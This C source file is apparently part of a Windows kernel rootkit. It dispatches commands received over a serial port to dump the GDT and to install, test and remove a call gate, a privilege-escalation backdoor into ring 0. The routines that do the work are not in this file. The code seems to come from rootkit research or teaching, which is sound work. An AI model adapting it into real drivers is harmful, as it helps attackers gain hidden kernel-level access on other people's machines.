
#include "ntddk.h"
#include "command.h"
#include "serial.h"
#include "gdt.h"

// global values we track
int gInstalledCallGateNumber = -1; 

VOID process_rootkit_command(char *cmd)
{
	DbgPrint("CMD: %s", cmd);
	
	if(0 == strcmp(cmd, "help"))
	{
		char _help[] =	" command			description\r\n" \
						" -------			-----------\r\n" \
						" gdt				dump global descriptor table\r\n" \
						" install			install callgate\r\n" \
						" remove			remove callgate\r\n" \
						" test				test callgate\r\n" \
						" help				this menu\r\n";
		SendInformationToSerialPort(_help);
	}
	else if(0 == strcmp(cmd, "gdt"))
	{
		DumpGDT();
	}
	else if(0 == strcmp(cmd, "install"))
	{
		if(-1 != gInstalledCallGateNumber)
		{
			conprintf("Error - there is already a callgate installed\r\n");
		}
		else
		{
			gInstalledCallGateNumber = InstallCallgate();
			if(-1 == gInstalledCallGateNumber)
			{
				conprintf("Error - the callgate was not installed\r\n");
			}
			else
			{
				conprintf("Success - the callgate was installed into entry %d in the GDT\r\n", gInstalledCallGateNumber);
			}
		}
	}
	else if(0 == strcmp(cmd, "remove"))
	{
		if(-1 == gInstalledCallGateNumber)
		{
			conprintf("Error - the callgate is not installed\r\n");
		}
		else
		{
			RemoveCallgate(gInstalledCallGateNumber);
			gInstalledCallGateNumber = -1;
		}
	}
	else if(0 == strcmp(cmd, "test"))
	{
		if(-1 == gInstalledCallGateNumber)
		{
			conprintf("Error - the callgate is not installed\r\n");
		}
		else
		{
			TestCallgate(gInstalledCallGateNumber);
		}
	}
}